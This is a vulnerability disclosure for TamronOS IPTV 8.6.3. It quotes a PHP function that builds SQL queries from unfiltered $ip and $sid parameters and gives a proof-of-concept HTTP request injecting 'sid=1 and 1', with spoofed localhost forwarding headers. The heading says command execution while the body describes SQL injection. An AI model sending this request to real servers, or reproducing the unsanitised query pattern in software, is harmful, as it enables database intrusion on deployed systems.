# Tamronos-iptv-update_server_status-sql

The TamronOS IPTV system has command execution vulnerabilities

official website：http://www.tamronos.com/


## Vulnerability Details

The `update_server_status()` method in the `iptv/Controllers/ApkapiController.php` file was directly passed into the `updateserver()` method without filtering the `$ip`, `$sid`, and `$netstream` parameters passed in by the user, resulting in SQL injection.
![image](https://github.com/yuxianzi/Tamronos-iptv-CVE/assets/41229220/ae4e9386-0ca1-4da5-aa34-40bd6473f781)




updateserver() Code:
```
	function updateserver($ip,$sid,$netstream)
	{
		$sql = "select * from videoserver where ip='".$ip."' and sid=".$sid;
		$this->query($sql);
        if(!is_numeric($netstream))
            $netstream = 0;
        $sql = "update videoserver set netstream=".$netstream." where ip='".$ip."' and sid=".$sid;
        //error_log($sql);
        $this->query($sql);
	}
```
![image](https://github.com/yuxianzi/Tamronos-iptv-CVE/assets/41229220/718016c0-0d0e-441b-ba32-c3661513066d)


## Recurrence vulnerability
Test version : `TamronOS IPTV 8.6.3`

request data
```
POST /api/update_server_status.ecgi HTTP/1.1
Host: 172.16.49.166
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Referer: http://172.16.49.166/manage
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
sec-ch-ua-platform: "macOS"
sec-ch-ua: "Google Chrome";v="111", "Chromium";v="111", "Not=A?Brand";v="24"
sec-ch-ua-mobile: ?0
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 16

ip=1&sid=1 and 1
```
![image](https://github.com/yuxianzi/Tamronos-iptv-CVE/assets/41229220/86b53221-f1c1-4eb4-94f7-1e435745857e)
